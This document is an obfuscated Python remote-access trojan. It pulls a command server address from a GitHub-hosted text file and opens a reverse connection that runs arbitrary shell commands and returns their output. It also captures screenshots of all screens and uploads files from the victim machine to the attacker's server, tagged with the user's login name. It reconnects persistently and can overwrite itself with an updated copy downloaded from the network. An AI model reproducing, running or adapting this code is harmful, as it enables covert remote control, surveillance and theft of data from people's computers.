import subprocess,socket,time,requests,os
from PIL import ImageGrab
YOEZIHfbGZJOrkN = "04.12.24.13"
REuHvukFQDfbhfseqWY = ""
hJYOfQEeTsGGCjdE = ""
TRrsiiYiXGbjurYLpZu = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
JaifcVuhoYNwXZcT = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
YdalqtlRRjcYdqi = "!"
def EewOIdZVTKLCHsUeilwHrRZ(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def BbZyBMOrCHBlLsEHTF(s):
	eDogRRnRxyteOuqAFwmV = s.recv(1024)
	if len(eDogRRnRxyteOuqAFwmV)==0:
		return True
	xBLncrmYvvKUFGWoPPCihG = eDogRRnRxyteOuqAFwmV.decode("utf-8").replace("\n","")
	if not xBLncrmYvvKUFGWoPPCihG.startswith(YdalqtlRRjcYdqi):
		proc = subprocess.run(xBLncrmYvvKUFGWoPPCihG, shell=True, capture_output=True)
		XWnoyVmEVNPjEipURzXOEhq = proc.stdout + proc.stderr
		s.send(XWnoyVmEVNPjEipURzXOEhq)
		return
	EFtBmoG = xBLncrmYvvKUFGWoPPCihG.split(" ")[0][1:]
	if EFtBmoG == "download":
		hmuYhNKoVzOd(s, xBLncrmYvvKUFGWoPPCihG)
	elif EFtBmoG == "screenshot":
		fRqlmvu(s)
def hmuYhNKoVzOd(s, xBLncrmYvvKUFGWoPPCihG):
	QxCcyngsAYDzqzMUEAXjLZ = xBLncrmYvvKUFGWoPPCihG.replace(YdalqtlRRjcYdqi+"download ","").split(",")
	XWnoyVmEVNPjEipURzXOEhqs = ""
	for f in QxCcyngsAYDzqzMUEAXjLZ:
		XWnoyVmEVNPjEipURzXOEhqs += pMyHDxkncEbcEvJw(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(XWnoyVmEVNPjEipURzXOEhqs, "utf-8"))
def fRqlmvu(s):
	wcORjmXK = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	TeOEkvNBqWNLzYsW = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	wcORjmXK.save(TeOEkvNBqWNLzYsW)
	wcORjmXK.close()
	r = pMyHDxkncEbcEvJw(TeOEkvNBqWNLzYsW, "api/sscap")
	os.remove(TeOEkvNBqWNLzYsW)
	s.send(bytes(r,"utf-8"))
def pMyHDxkncEbcEvJw(zXLbfGnysMVQNUSIILtw, eOPaMBpV, atbjMbo=None):
	if not os.path.exists(zXLbfGnysMVQNUSIILtw):
		return "[!] NOT FOUND: "+zXLbfGnysMVQNUSIILtw+"\n"
	headers = {"user":os.getlogin()}
	if atbjMbo is not None:
		headers = {**headers, **atbjMbo}
	requests.post("http://"+REuHvukFQDfbhfseqWY+":5555/"+eOPaMBpV,
		files={"file":open(zXLbfGnysMVQNUSIILtw, "rb")},
		headers=headers)
	return "[+] SUCCESS: "+zXLbfGnysMVQNUSIILtw+"\n"
def eIgSNtboGxNq():
	global REuHvukFQDfbhfseqWY, hJYOfQEeTsGGCjdE
	if REuHvukFQDfbhfseqWY == "" or hJYOfQEeTsGGCjdE == "":
		eDogRRnRxyteOuqAFwmV = requests.get(TRrsiiYiXGbjurYLpZu).text.replace("\n","").split(":")
		REuHvukFQDfbhfseqWY = eDogRRnRxyteOuqAFwmV[0].strip()
		hJYOfQEeTsGGCjdE = eDogRRnRxyteOuqAFwmV[1].strip()
		gaooVTwiksNTzvl = eDogRRnRxyteOuqAFwmV[2].strip()
	return REuHvukFQDfbhfseqWY, hJYOfQEeTsGGCjdE, gaooVTwiksNTzvl
def UjMmSarPEeRrMCW():
	NEefTPxiZIxnfDE = os.path.basename(__file__)
	fileType = NEefTPxiZIxnfDE.split(".")[-1]
	wnMTkVBDTuOJnlMu = NEefTPxiZIxnfDE.replace("."+fileType,"") +"."+YOEZIHfbGZJOrkN + "."+fileType
	NWwTUdwaBOPjxH = os.path.join(os.getcwd(), wnMTkVBDTuOJnlMu)
	with open(wnMTkVBDTuOJnlMu, "w+") as f:
		f.write(requests.get(JaifcVuhoYNwXZcT+"file."+NWwTUdwaBOPjxH.split(".")[-1]).text)
	#if fileType == "exe":
	#	os.system(".\"+NWwTUdwaBOPjxH")
	#elif fileType.startswith("py"):
	#	os.system("python "+NWwTUdwaBOPjxH)
def ihKCjTRInihahNTbEl():
	pass
def uWQYjotMHdPSBeiMGSt():
	h, p, v = eIgSNtboGxNq()
	if YOEZIHfbGZJOrkN != v:
		UjMmSarPEeRrMCW()
	ihKCjTRInihahNTbEl()
	WnmgWHCOsqiZodRFnNUvBsx = bytes("["+YOEZIHfbGZJOrkN+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				sdvArsFoudrhEdjpOJOPsxX=False
				try:
					s=EewOIdZVTKLCHsUeilwHrRZ(h, p)
					while not sdvArsFoudrhEdjpOJOPsxX:
						s.send(WnmgWHCOsqiZodRFnNUvBsx)
						sdvArsFoudrhEdjpOJOPsxX=BbZyBMOrCHBlLsEHTF(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
uWQYjotMHdPSBeiMGSt()
